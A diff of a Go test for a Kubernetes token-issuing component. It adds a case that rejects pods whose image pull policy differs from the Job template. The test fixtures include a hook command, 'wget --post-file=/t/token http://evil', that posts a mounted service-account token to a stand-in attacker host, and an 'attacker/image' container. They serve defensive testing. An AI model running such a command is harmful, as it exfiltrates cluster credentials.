@@ -1168,7 +1168,7 @@ func TestOlderEpochNeverReplacesLatest(t *testing.T) {
 // TestJobPodMustRunTheJobTemplate (reviewer #3 finding 3): an
 // ownerReference to a registered Job is not enough.
 func TestJobPodMustRunTheJobTemplate(t *testing.T) {
-	agent := corev1.Container{Name: "wsnap", Image: "wsnap-agent:dev", Args: []string{"maintain"},
+	agent := corev1.Container{Name: "wsnap", Image: "wsnap-agent:dev", ImagePullPolicy: corev1.PullIfNotPresent, Args: []string{"maintain"},
 		VolumeMounts: []corev1.VolumeMount{{Name: "wsnap-token", MountPath: "/t"}}}
 	tokenVol := corev1.Volume{Name: "wsnap-token", VolumeSource: corev1.VolumeSource{Projected: &corev1.ProjectedVolumeSource{
 		Sources: []corev1.VolumeProjection{{ServiceAccountToken: &corev1.ServiceAccountTokenProjection{Audience: "wsnap", Path: "token"}}}}}}
@@ -1178,6 +1178,8 @@ func TestJobPodMustRunTheJobTemplate(t *testing.T) {
 	vols := tmpl.Volumes
 	evil := agent
 	evil.Image = "attacker/image"
+	pullAlways := agent
+	pullAlways.ImagePullPolicy = corev1.PullAlways
 	hooked := agent
 	hooked.Lifecycle = &corev1.Lifecycle{PostStart: &corev1.LifecycleHandler{Exec: &corev1.ExecAction{Command: []string{"sh", "-c", "wget --post-file=/t/token http://evil"}}}}
 	probed := agent
@@ -1195,6 +1197,7 @@ func TestJobPodMustRunTheJobTemplate(t *testing.T) {
 		{"the job's own pod", tmpl, false, 200},
 		{"an admission webhook added a container", corev1.PodSpec{Containers: []corev1.Container{agent, sidecarMesh}, Volumes: vols}, false, 200},
 		{"another image", corev1.PodSpec{Containers: []corev1.Container{evil}, Volumes: vols}, false, 403},
+		{"different image pull policy", corev1.PodSpec{Containers: []corev1.Container{pullAlways}, Volumes: vols}, false, 403},
 		// Reviewer #6: hooks and probes run inside the agent container.
 		{"an exec hook on the agent", corev1.PodSpec{Containers: []corev1.Container{hooked}, Volumes: vols}, false, 403},
 		{"an exec probe on the agent", corev1.PodSpec{Containers: []corev1.Container{probed}, Volumes: vols}, false, 403},
